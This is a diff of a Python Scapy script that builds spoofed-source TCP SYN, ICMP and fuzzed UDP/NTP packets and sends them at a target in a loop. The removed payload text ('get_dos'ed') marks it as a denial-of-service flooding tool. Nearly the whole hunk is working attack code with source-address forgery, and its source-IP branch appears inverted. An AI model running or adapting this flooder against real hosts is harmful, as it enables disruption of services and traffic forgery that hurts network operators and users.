@@ -7,11 +7,10 @@ count = int(input("Count: "))
 srcIp = input("Source IP (opt): ") 
 
 if srcIp != "":
-    packetT = IP(dst=target_ip, len=RawVal(b"get_dos'ed ^w^"), src="192.168.2.34") / TCP(flags="S") 
-else: packetT = IP(dst=target_ip, len=RawVal(b"get_dos'ed ^w^"), src=srcIp) / TCP(flags="S") 
-packetI = IP(dst=target_ip, len=RawVal(b'Hiiiiiiiiii :3c'), src="192.168.2.34") / ICMP() 
-packetU = IP(dst=target_ip, len=RawVal(b"Go have a nice cup of iced tea instead why don't you. Maybe a whisky on the rocks. Who's gonna stop you? Not me, I'm just a dumbass packet"),
-            src="192.168.2.34") / fuzz(UDP()/NTP()) 
+    packetT = IP(dst=target_ip, src="192.168.2.34") / TCP(flags="S") 
+else: packetT = IP(dst=target_ip, src=srcIp) / TCP(flags="S") 
+packetI = IP(dst=target_ip, src="192.168.2.34") / ICMP() 
+packetU = IP(dst=target_ip, src="192.168.2.34") / fuzz(UDP()/NTP()) 
 
 sent_count = 0 
 for i in range(count):
